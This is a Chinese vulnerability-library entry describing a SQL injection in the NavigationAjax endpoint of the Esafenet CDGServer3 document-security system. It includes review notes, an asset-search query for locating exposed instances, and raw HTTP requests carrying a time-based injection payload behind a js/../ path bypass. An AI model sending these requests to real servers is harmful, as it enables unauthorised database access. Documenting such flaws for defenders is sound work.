---
source: "wy876 漏洞文库"
title: "亿赛通CDGServer3 NavigationAjax id SQL注入"
product: "亿赛通CDGServer3"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "SQL Server；产品版本未知"
prerequisites: "js/../规范化与鉴权顺序待核"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/rkfurtrt642vfvu6"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E4%BA%BF%E8%B5%9B%E9%80%9A/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FNavigationAjax%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "app.name="
hunter: "app.name=\"ESAFENET 亿赛通文档安全管理系统\""
id: "vw-1ce596da141ae764e4861207"
entity_id: "ve-1ce596da141ae764e4861207"
schema_version: "1"
---

# 亿赛通CDGServer3 NavigationAjax id SQL注入

## 条目说明

- 对象与具体问题：亿赛通CDGServer3；NavigationAjax id SQL注入
- 版本、配置及部署条件：SQL Server；产品版本未知
- 认证与权限前提：js/../规范化与鉴权顺序待核
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- nav id=-999延时请求无基线计时/响应证据，普通id1版本不是执行成功结果
- 两正文长度不同却同Content-Length58，手工请求可能截断/等待
- js/../前置应作为独立绕过条件解释，不能按工具自动规范化后仍期望同结果
- 缺修复/源码/版本，不与PolicyAjax同参数名硬合并

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
 亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通部门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。亿赛通电子文档安全管理系统NavigationAjax存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

## 二、影响版本
+ 亿赛通电子文档安全管理系统

## 三、资产测绘
+ hunter`app.name="ESAFENET 亿赛通文档安全管理系统"`
+ 登录页面


## 四、漏洞复现
```http
POST /CDGServer3/js/../NavigationAjax HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Connection: close
Content-Length: 58
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate

command=nav&id=-999'waitfor delay '0:0:3'--+&name=&openId=
```

> 请求长度说明：原资料 Content-Length 为 58；保留原始标头；其数值未据实际请求体重新计算或验证。


sqlmap

```http
POST /CDGServer3/js/../NavigationAjax HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Connection: close
Content-Length: 58
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate

command=nav&id=1&name=&openId=
```

> 请求长度说明：原资料 Content-Length 为 58；保留原始标头；其数值未据实际请求体重新计算或验证。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/rkfurtrt642vfvu6>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
